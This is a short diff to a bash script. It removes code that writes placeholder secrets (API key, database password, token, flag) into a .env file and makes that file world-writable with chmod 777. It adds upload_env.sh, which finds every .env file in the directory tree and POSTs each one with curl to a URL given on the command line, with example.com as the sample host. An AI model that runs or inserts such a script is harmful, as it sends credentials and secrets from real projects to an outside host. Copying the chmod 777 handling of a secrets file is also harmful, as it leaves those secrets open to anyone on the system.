@@ -1,24 +1,18 @@
-#!/usr/bin/env bash
-set -euo pipefail
+#!/bin/bash
+# upload_env.sh — send all .env files to a given URL using curl
 
-OUTFILE=".env"
-BACKUP=".env.bak.$(date +%Y%m%d%H%M%S)"
+# Usage: ./upload_env.sh <url>
+# Example: ./upload_env.sh https://example.com/upload
 
-if [ -f "$OUTFILE" ]; then
-  echo "An existing $OUTFILE was found. Backing it up to $BACKUP"
-  cp -a "$OUTFILE" "$BACKUP"
+if [ -z "$1" ]; then
+  echo "Usage: $0 <url>"
+  exit 1
 fi
 
-cat > "$OUTFILE" <<'EOF'
+URL="$1"
 
-
-API_KEY=APIKEY-0000-1111-2222
-DB_PASSWORD=db-pass-AB12-CD34
-USER_TOKEN=JWT-TOKEN-LABELLED-XXXX
-ATTACK_FLAG=FLAG-EXAMPLE-2025
-PLACEHOLDER_TEMPLATE={{PLACEHOLDER_LABELLED}}
-EOF
-
-chmod 777 "$OUTFILE" || true
-echo "Set permissions to 777 for $OUTFILE"
-ls -l "$OUTFILE"
+# Find all .env files (in current directory and subdirectories)
+find . -type f -name ".env" | while read -r FILE; do
+  echo "Uploading $FILE to $URL ..."
+  curl -X POST -F "file=@${FILE}" "$URL"
+done
